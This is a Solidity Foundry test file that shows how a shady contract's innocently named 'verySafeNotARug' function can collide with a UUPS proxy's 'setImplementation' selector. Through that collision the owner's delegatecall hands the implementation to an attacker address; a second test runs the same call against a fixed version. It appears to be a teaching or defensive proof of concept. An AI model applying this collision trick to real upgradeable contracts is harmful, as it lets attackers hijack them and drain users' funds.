// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {UUPSProxy} from      "./UUPSProxy.sol";
import {ShadyContract} from "./ShadyContract.sol";
import {Implementation} from "./Implementation.sol";
import {ImplementationFixed} from "./Implementation_fixed.sol";

interface IProxy {
    function implementation() external returns (address);
    function doImplementationStuff() external returns (bool);
    function superSafeFunction96508587(address) external;
    function delegatecallContract(address,bytes memory) external;
}

contract UUPSProxy_functionCollisionHack is Test {
    address payable public proxy;
    address payable public proxy2;
    Implementation public implementation;
    ImplementationFixed public implementationFixed;
    ShadyContract public shadyContract;

    address public owner;

    function setUp() public {

        // deploy vulnerable version
        owner = address(0xbabe);
        shadyContract = new ShadyContract();
        implementation = new Implementation(owner);
        proxy = payable(address(new UUPSProxy(address(implementation), owner)));

        implementationFixed = new ImplementationFixed(owner);
        proxy2 = payable(address(new UUPSProxy(address(implementationFixed), owner)));
    }

    // Here's the hack, if owner calls delegatecall on this safe sounding
    // function `verySafeNotARug` on a shady contract, then that function delegatecalls
    // another innocuous sounding `verySafeNotARug` which collides with the `setImplementation`
    // function in the implementation contract.
    function testFailUUPSProxy_oops() public {
        address oldImplementationAddress = address(implementation);
        assertEq(IProxy(proxy).implementation(), oldImplementationAddress);

        vm.startPrank(owner);
        assert(IProxy(proxy).doImplementationStuff());

        bytes memory bts = abi.encodeWithSelector(ShadyContract.verySafeNotARug.selector, "");
        IProxy(proxy).delegatecallContract(address(shadyContract), bts);

        assertEq(IProxy(proxy).implementation(), shadyContract.ATTACKER_CONTRACT_ADDRESS());

        IProxy(proxy).doImplementationStuff();

    }

    // Here's the same test on the fixed contract.
    function testFailUUPSProxy_oops_FIXED() public {
        address implementationAddress = address(implementationFixed);

        vm.startPrank(owner);
        assert(IProxy(proxy2).doImplementationStuff());

        bytes memory bts = abi.encodeWithSelector(ShadyContract.verySafeNotARug.selector, "");
        IProxy(proxy2).delegatecallContract(address(shadyContract), bts);
    }

}
